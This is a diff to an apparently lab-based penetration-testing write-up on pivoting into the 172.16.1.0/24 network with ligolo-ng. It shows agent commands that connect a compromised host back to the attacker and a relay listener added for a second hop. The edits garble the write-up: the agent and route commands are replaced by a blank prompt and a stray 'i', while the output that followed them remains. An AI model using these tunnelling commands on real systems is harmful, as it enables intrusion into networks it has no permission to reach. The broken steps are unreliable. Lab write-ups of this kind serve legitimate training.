@@ -32,7 +32,7 @@ ligolo-ng » session
 Connect it from the target :
 
 ```bash
-root@DANTE-WEB-NIX01:/tmp# ./agent -connect 10.10.14.3:443 -ignore-cert
+root@DANTE-WEB-NIX01:/tmp#  
 WARN[0000] warning, certificate validation disabled     
 INFO[0000] Connection established                        addr="10.10.14.16:443"
 ```
@@ -50,7 +50,7 @@ Network setting on kali :
 
 
 ┌──(kali㉿kali)-[~/htb/PwnKit]
-└─$ sudo ip route add 172.16.1.0/24 dev ligolo
+└─$ i
 [sudo] password for kali: 
 
 
@@ -64,3 +64,7 @@ default via 192.168.45.2 dev eth0 proto dhcp src 192.168.45.131 metric 100
 ```
 
 Now I can send packet to `172.16.1.0/24` network.
+
+listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
+
+.\agent.exe -connect 172.16.1.100:11602 -ignore-cert -retry
